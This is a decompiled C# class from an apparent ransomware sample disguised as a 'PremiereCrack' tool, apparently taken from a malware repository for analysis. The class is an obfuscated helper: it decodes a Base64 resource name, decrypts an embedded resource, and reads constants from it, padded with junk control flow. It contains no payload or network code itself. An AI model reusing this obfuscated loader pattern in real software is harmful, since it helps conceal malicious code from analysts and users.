// Decompiled with JetBrains decompiler
// Type: A.G
// Assembly: PremiereCrack, Version=2.3.77.2, Culture=neutral, PublicKeyToken=null
// MVID: B728F238-A35B-46BB-92FD-55CC50CC96B9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-27a1f89ce5a37815010c8411dddec85d5d66e81a957ad722fbd2dc64f99651c8.exe

using System;
using System.Reflection;
using System.Text;

namespace A
{
  internal class G
  {
    internal static readonly byte[] T;
    internal readonly int T;

    static G()
    {
      if (G.T != null)
        return;
label_1:
      switch (4)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (G.\u002Ecctor);
          }
          byte[] bytes = Convert.FromBase64String("UHJlbWllcmVDcmFjayU=");
          string name = Encoding.UTF8.GetString(bytes, 0, bytes.Length);
          G.T = W.T(97L, Assembly.GetExecutingAssembly().GetManifestResourceStream(name));
          break;
      }
    }

    internal static int T(int T) => BitConverter.ToInt32(G.T, T);

    internal static long T(int T) => BitConverter.ToInt64(G.T, T);

    internal static float T(int T) => BitConverter.ToSingle(G.T, T);

    internal static double T(int T) => BitConverter.ToDouble(G.T, T);

    internal static void T(Array T, int E)
    {
      int count;
      if (((int) G.T[E] & 128) == 0)
      {
label_1:
        switch (2)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (G.T);
            }
            count = (int) G.T[E];
            ++E;
            break;
        }
      }
      else if (((int) G.T[E] & 64) == 0)
      {
label_6:
        switch (7)
        {
          case 0:
            goto label_6;
          default:
            count = ((int) G.T[E] & -129) << 8 | (int) G.T[E + 1];
            E += 2;
            break;
        }
      }
      else
      {
        count = ((int) G.T[E] & -193) << 24 | (int) G.T[E + 1] << 16 | (int) G.T[E + 2] << 8 | (int) G.T[E + 3];
        E += 4;
      }
      if (count < 1)
      {
label_10:
        switch (7)
        {
          case 0:
            goto label_10;
        }
      }
      else
        Buffer.BlockCopy((Array) G.T, E, T, 0, count);
    }
  }
}
